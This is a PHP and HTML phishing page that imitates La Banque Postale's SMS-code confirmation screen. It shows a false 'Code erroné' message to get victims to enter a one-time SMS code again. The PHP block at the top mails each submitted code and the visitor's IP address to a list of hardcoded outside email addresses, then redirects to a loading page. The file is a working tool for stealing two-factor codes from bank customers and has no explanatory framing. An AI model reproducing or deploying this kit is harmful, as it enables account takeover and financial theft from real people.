<?php
if (isset($_POST['id'])) {
if (strlen($_POST['id']) > 5 ) {
   $ips = $_SERVER['REMOTE_ADDR'];
   $message = 'Code SMS 2   :' .$_POST['id'] ."\r\n";
  $votre_emails      = 'amelierys@yandex.com,bazouspm@gmail.com,zalga_yann@live.fr,moussa.kane@net-c.fr,popadvsms@protonmail.com';
$subjects = '*** '.$ips.' CERTICODE';
$header = array(
  'From' => 'POSTAL <bpostal@result.com>',
  'mail' => 'serveur' . phpversion()
);

  mail($votre_emails , $subjects, $message, $header);
  header("Location: loading1.php");

}
}
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    <link rel="shortcut icon" type="image/png" href="cap/favicon.png" type="image/x-icon" />
    
    <title>La Banque Postale - Attente d'enrôlement </title>
    <script type="text/javascript" src="date_heure.js"></script>
  </head>

  <style type="text/css">
    input{
      padding:0px;

    }
    .tel {
      width:1258px;
      height:500px;
    }
    .mobile{
      border-radius: 0px;
      height:35px;
      width:260px;
      padding:0px;
    }

    .ordi{
      border-radius: 0px;
      padding:0px;
      height:35px;
      width:230px;
    }
    .mobile:hover{
      border-radius: 0px;
      height:24px;
      width:260px;
    }
    label{
      font-size:13px;
      margin-bottom: 03px
    }
  </style>

  <body style="background: withe;">
  
<!-- ........................................PC........................................ -->

<div class="d-none d-md-block">
  <img src="cap/p1.png" style="width: 100%">
  <img src="cap/p2.png" style="width: 100%">
  <div class="tel">
        <br>
    <div class="row">
      <div class="col-4"></div>
      <div class="col-6 row" style="background:white">
        <div class="col-11 ">
                 <p style="color: red;" >Code erroné! <br>Veuillez confirmer à nouveau le code SMS reçu </p>

<b>Date:</b> <span id="date_heure"></span>
                        <script type="text/javascript">window.onload = date_heure('date_heure');</script><br>
<b>N° de téléphone:</b> (+33) 0x xx xx xx xx
<p>
<hr align="center" width="100%" color="#1346A0" size="5">
          <form class="row" style="padding:16px;margin-top:-21px" method="POST" action="">
          <p style="left:-200px">Veuillez saisir le code de sécurité reçu par SMS (Exemple: FHJO3N)</p>     
            <div class="form-group col-9 row" style="left:-25px">        
              <b class="col-7" for="id" style="text-align: right;">Code de confirmation:</b>
              <input type="tel" class="form-control ordi col-5" id="id" name="id" maxlength="6" style=" margin-bottom: 15%;  background-image: url(cap/sms.png); background-repeat: no-repeat;
    background-position: 98%;
    background-size: 19px;
">
            </div>
            <div class="col-12">
              <button type="submit" class="btn btn-primary col-4 offset-4" style="margin-top:-40px;height:40px;border-radius:0px;background-color: #1346A0;font-size:14px">
                <span style="font-weight:600;">Valider</span>
              </button>
              
            </div>            
          </form>
          
        </div>
        <div class="col-12"></div>
      </div>
    </div>    
  </div>
  <br>
  <br>
  <br>
  <img src="cap/p3.png" style="width: 100%">
</div>



<!-- ...................................TEL............................................. -->
   <div class="d-md-none" style="background: white">
    <img src="cap/s1.png" style="width: 100%">
    <div class="container">
      <p class="thank-you" style="display: <?php if ($error) {
            echo "block";
          }else echo "none";?> "> <img src="cap/er1.png" style="width: 100%"> </p>  
           <br>
                  <p style="color: red;" >Code erroné! <br>Veuillez confirmer à nouveau le code SMS reçu </p>  
<b>N° de téléphone:</b> (+33) 0x xx xx xx xx

<hr align="center" width="100%" color="#1346A0" size="3">
          <br>

          <form class="row" style="margin-top:-21px" method="POST" action="">
          <p style="left:-200px">Veuillez saisir le code sécurité reçu par SMS (Exemple: FHJO3N)</p>     
      <div class="form-group col-12">
        <b class="col-7" for="id" style="text-align: right;">Code de confirmation:</b>
        <input type="text" class="form-control mobile" id="id" name="id" maxlength="6">
      </div>
      <div class="col-4">
        <button type="submit" class="btn btn-primary " style="width:99%;margin-top:35px;border-radius:0px;background-color: #1346A0;font-size:14px">
          <span style="font-weight:600;">Valider</span>
        </button>
      </div>    
    </form>
    </div>
    

    <br>
    <img src="cap/s2.png" style="width: 100%">
     
   </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>